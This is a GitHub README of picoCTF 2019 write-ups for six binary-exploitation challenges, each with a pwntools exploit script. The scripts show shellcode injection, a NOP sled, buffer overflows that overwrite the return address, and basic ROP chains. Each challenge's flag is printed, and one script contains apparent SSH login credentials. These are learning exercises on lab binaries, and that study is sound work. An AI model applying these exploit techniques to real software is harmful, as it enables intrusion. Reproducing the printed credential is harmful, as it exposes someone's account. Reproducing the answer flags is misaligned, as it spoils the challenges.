
# PICO CTF (2019)<a name="picoctf19"></a>
[<p align="right">back to main</p>](https://github.com/Ordered-Chaos/Pwnfolio#main)
***
## Table of Contents
| Problem | Category | Points | Problem | Category | Points |
| ------- | -------- | ------ | ------- | -------- | ------ | 
| [Handy Shellcode](#handyshellcode) | Binary Exploitation | 50 | [Overflow 0](#overflow0) | Binary Exploitation | 100 |
| [Slippery Shellcode](#slipperyshellcode) | Binary Exploitation | 200 | [Overflow 1](#overflow1) | Binary Exploitation | 150 |
|  New Overflow | Binary Exploitation | 200 | [Overflow 2](#overflow2) | Binary Exploitation | 250 |
***

## HANDY SHELLCODE <a name="handyshellcode"></a>

> ### Problem 
>> This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? 
>> You can find the program in /problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6 on the shell server. 
>> [(Source)](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/Pico_CTF(2019)/Sources/handshellcodesource.md#handyshellsource)
>
> ### Solution
>> The solution here is pretty straightforward. All you need to do is supply the program with shellcode
>> and it will execute it. A simple pwntools script using `shellcraft.sh()` as the payload can get this done.

~~~python
#!/usr/bin/env python

from pwn import *

context.clear(os='linux', arch='i386')
context.log_level = 'info'

s = ssh(host='2019shell1.picoctf.com', user='User', password='Pa$$w0rd')

io = s.process('vuln',cwd='/problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6')

shellcode = asm(shellcraft.sh())

payload = shellcode

print io.recv()
io.sendline(payload)

print io.recv()
io.sendline('cat flag.txt')

print io.recv()

~~~

**Flag:** *picoCTF{h4ndY_d4ndY_sh311c0d3_707f1a87}*

[Return to Top](#picoctf19)
***

## SLIPPERY SHELLCODE <a name="slipperyshellcode"></a>

> ### Problem 
>> This program is a little bit more tricky. Can you spawn a shell and use that to read the flag.txt? 
>> You can find the program in /problems/slippery-shellcode_6_7cf1605ec6dfefad68200ceb12dd67a1 on the shell server.
>> [(Source)](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/Pico_CTF(2019)/Sources/slipperyshellcode.md#slipperyshellsource1)
>
> ### Solution
>> In this challenge we again need to supply the program with shellcode using `shellcraft.sh()`. The source code
>> reveals that this time, the program will begin execution of the shellcode from a random location within a 256 
>> byte range. To make sure that we execute our code, all that needs to be done is to supply an 'x\90' NOP sled
>> that's 256 bytes long directly preceding the shellcode. This can be done with the following pwntools script.

~~~python
#!/usr/bin/env python

from pwn import *

context.clear(os='linux', arch='i386')
context.log_level = 'info'

s = ssh(host='2019shell1.picoctf.com', user='User', password='Pa$$w0rd')

io = s.process('vuln',cwd='/problems/slippery-shellcode_6_7cf1605ec6dfefad68200ceb12dd67a1')

padding = '\x90' * 256
shellcode = asm(shellcraft.sh())

payload = padding + shellcode

print io.recv()
io.sendline(payload)

print io.recv()
io.sendline('cat flag.txt')

print io.recv()
~~~

**Flag:** *picoCTF{sl1pp3ry_sh311c0d3_5a0fefb6}*

[Return to Top](#picoctf19)
***
## OVERFLOW 0<a name="overflow0"></a>

> ### Problem
>> This should be easy. Overflow the correct buffer in this program and get a flag. Its also found in 
>> /problems/overflow-0_1_54d12127b2833f7eab9758b43e88d3b7 on the shell server. [(Source)](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/Pico_CTF(2019)/Sources/overflow0source.md#overflow0source1)

> ###  Solution
>> After looking at the program, you can tell that it checks to see if `argv[]` is greater or less than the buffer. If it is, then it prints the flag file.
>> So all we have to do is call `./vuln` with more than 64 arguments.
~~~bash
kali@kali:~/ctf/pico/overflow0$ ssh User@2019shell1.picoctf.com 'cd /problems/
overflow-0_1_54d12127b2833f7eab9758b43e88d3b7; ./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
~~~

**Flag:** *picoCTF{3asY_P3a5yb197d4e2}*

[Return to Top](#picoctf19)
***

## OVERFLOW 1<a name="overflow1"></a>

> ### Problem
>> You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this program? 
>> You can find it in /problems/overflow-1_6_0a7153ff536ac8779749bc2dfa4735de on the shell server.
>> [(Source)](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/Pico_CTF(2019)/Sources/overflow1source.md#overflow1source1)

> ### Solution
>> To solve this challenge there are a few boxes we need to check. We need to:

>> [x] Find out how long the buffer is and at what point we overwrite the `eip` register
>>> To do this I used pwntools script like the one below except I set the payload to `payload = cyclic(512)` 
>>> as well as added the line `gdb.attach(io, gdbscript='b* main')`. This allows you to open the file in pwndbg and 
>>> send a 512 byte long cyclic pattern to make it crash. After the crash you can see that the `eip` register was overwritten
>>> at `'taaa'` in the pattern. 
>>
>> [x] Find the address of the flag function
>>> Using radare2's `afl` command your able to see a list of functions with addresses. This list includes the flag function.
>> 
>> [x] Craft a payload that fills up the buffer up to `eip`, then overwrite `eip` with the flag function address
>>>  A pwntools script like the one below can get the job done.

~~~python
#!/usr/bin/env python

from pwn import *

context.clear(os='linux', arch='i386')
context.log_level = 'info'

s = ssh(host='2019shell1.picoctf.com', user='User', password='Pa$$w0rd')

io = s.process('vuln',cwd='/problems/overflow-1_6_0a7153ff536ac8779749bc2dfa4735de')

padding = cyclic(cyclic_find('taaa'))
flag = p32(0x080485e6)

payload = padding 
payload += flag

print io.recv()
io.sendline(payload)

print io.recv()
~~~

**Flag:** *picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5b80c9cbf}*

[Return to Top](#picoctf19)
***

## OVERFLOW 2<a name="overflow2"></a>

> ### Problem
>> Now try overwriting arguments. Can you get the flag from this program? You can find it in 
>> /problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446 on the shell server.
>> [(Source)](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/Pico_CTF(2019)/Sources/overflow2source.md#overflow2source1)

> ### Solution
>>
>>
>>

~~~python
#!/usr/bin/env python

from pwn import *

# elf = context.binary = ELF('vuln')
context.update(os='linux', arch='i386')
context.log_level = 'info'

s = ssh(host='2019shell1.picoctf.com', user='User', password='Pa$$w0rd')

io = s.process('vuln',cwd='/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446')

# io = process(elf.path)

padding = cyclic(cyclic_find('waab'))          # location of pattern match @ eip
argu1 = p32(0xdeadbeef)                        # first argurment to pass to flag function
argu2 = p32(0xc0ded00d)                        # second argument to pass to flag function
rop = p32(0x0804878a)                          # pop edi; pop ebp; ret;
flag = p32(0x080485e6)                         # address of flag function

payload = padding 
payload += flag
payload += rop
payload += argu1
payload += argu2


# gdb.attach(io, gdbscript = 'b* main')

print io.recv()
io.sendline(payload)
print io.recv()
~~~

**Flag:** *picoCTF{arg5_and_r3turn51b106031}*

[Return to Top](#picoctf19)
***

##  New Overvflow<a name="newoverflow"></a>

> ### Problem
>> Lets try moving to 64-bit, but don't worry we'll start easy. Overflow the buffer and change the return 
>> address to the flag function in this program. You can find it in /problems/newoverflow-1_2_706ae8f01197e
>> 5dbad939821e43cf123 on the shell server. [(Source)](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/Pico_CTF(2019)/Sources/newoverflow.md#newoverflowsource1)

> ### Solution
>>
>>
>>
~~~python
#!/usr/bin/python

from pwn import *

# elf = context.binary = ELF('vuln')
context.update(os='linux', arch='amd64')
context.log_level = 'info'

s = ssh(host='2019shell1.picoctf.com', user='Intrinsic', password='Kanoa2019')

io = s.process('vuln',cwd='/problems/newoverflow-1_2_706ae8f01197e5dbad939821e43cf123')

# io = process(elf.path)

padding = cyclic(cyclic_find('saaa'))          # location of pattern match @ rsp
rop = p64(0x004008c4)
flag = p64(0x00400767)                         # address of flag function

payload = padding
payload += rop
payload += flag


# gdb.attach(io, gdbscript = 'b* main')

io.sendline(payload)

print io.recvall()
~~~

**Flag:** *picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_7a154fef}*

[Return to Top](#picoctf19)
***
